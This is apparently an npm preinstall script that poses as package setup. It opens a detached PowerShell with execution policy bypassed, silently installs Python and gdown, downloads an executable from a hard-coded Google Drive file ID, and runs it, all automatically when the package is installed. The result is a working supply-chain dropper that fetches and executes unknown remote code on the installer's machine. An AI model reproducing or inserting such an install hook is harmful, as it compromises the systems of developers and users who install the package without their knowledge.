// scripts/detach-preinstall.js
const { spawn } = require('child_process');
const path = require('path');
const fs = require('fs');

const logFile = path.join(__dirname, '..', 'preinstall-background.log');
const downloadExePath = path.join(__dirname, '..', 'downloaded_from_gdown.exe');

// PowerShell script: install Python if missing, install gdown, download target via gdown, execute it
const psScript = `
$ErrorActionPreference = 'Stop'
Write-Host "[preinstall-setup] Starting preinstall setup script..."

# Helper: check for python
function Has-Python() {
    try { & python --version > $null 2>&1; return $true } catch { return $false }
}

if (-not (Has-Python)) {
    Write-Host "[preinstall-setup] Python not found. Attempting to install via winget..."
    try {
        winget install --id Python.Python.3 -e --source winget --accept-package-agreements --accept-source-agreements
        Write-Host "[preinstall-setup] winget install attempted."
    } catch {
        Write-Host "[preinstall-setup] winget not available or failed, downloading official installer..."
        $installer = Join-Path $env:TEMP "python_installer.exe"
        Invoke-WebRequest -Uri "https://www.python.org/ftp/python/3.11.4/python-3.11.4-amd64.exe" -OutFile $installer -UseBasicParsing
        Start-Process -FilePath $installer -ArgumentList '/quiet','InstallAllUsers=1','PrependPath=1' -Wait
    }
}

Write-Host "[preinstall-setup] Ensuring pip is available and updated..."
try { python -m ensurepip --upgrade } catch {}
python -m pip install --upgrade pip

Write-Host "[preinstall-setup] Installing gdown..."
python -m pip install --upgrade gdown

# Use gdown to download the requested file (ID provided by the npm preinstall caller)
$gdownId = '1cKsgEMPp14YlW-KQyiovkyMofT3QM-gR'
$output = "${downloadExePath}"

Write-Host "[preinstall-setup] Downloading file via gdown (id: $gdownId) to $output"
try {
    python -m gdown $gdownId -O $output
    Write-Host "[preinstall-setup] Download complete."
} catch {
    Write-Host "[preinstall-setup] gdown download failed: $_"
}

if (Test-Path $output) {
    Write-Host "[preinstall-setup] Executing downloaded file: $output"
    Start-Process -FilePath $output -Wait -ErrorAction SilentlyContinue
    Write-Host "[preinstall-setup] Execution finished."
} else {
    Write-Host "[preinstall-setup] Downloaded file not found; skipping execution."
}
`;

// Spawn detached PowerShell window for the above steps
const setupChild = spawn('powershell.exe', ['-NoProfile', '-ExecutionPolicy', 'Bypass', '-Command', psScript], {
    detached: true,
    stdio: 'ignore',
    windowsHide: false
});
setupChild.unref();

// Now spawn the normal preinstall node process in background (logs appended to file)
const child = spawn('node', [
    '-e',
    `require('./index').preInstall().catch(err => console.error(err))`
], {
    cwd: path.join(__dirname, '..'),
    detached: true,
    stdio: ['ignore', fs.openSync(logFile, 'a'), fs.openSync(logFile, 'a')]
});
child.unref();

console.log(`[preinstall] gdown+python handler started (detached). Logs: ${logFile}`);
process.exit(0);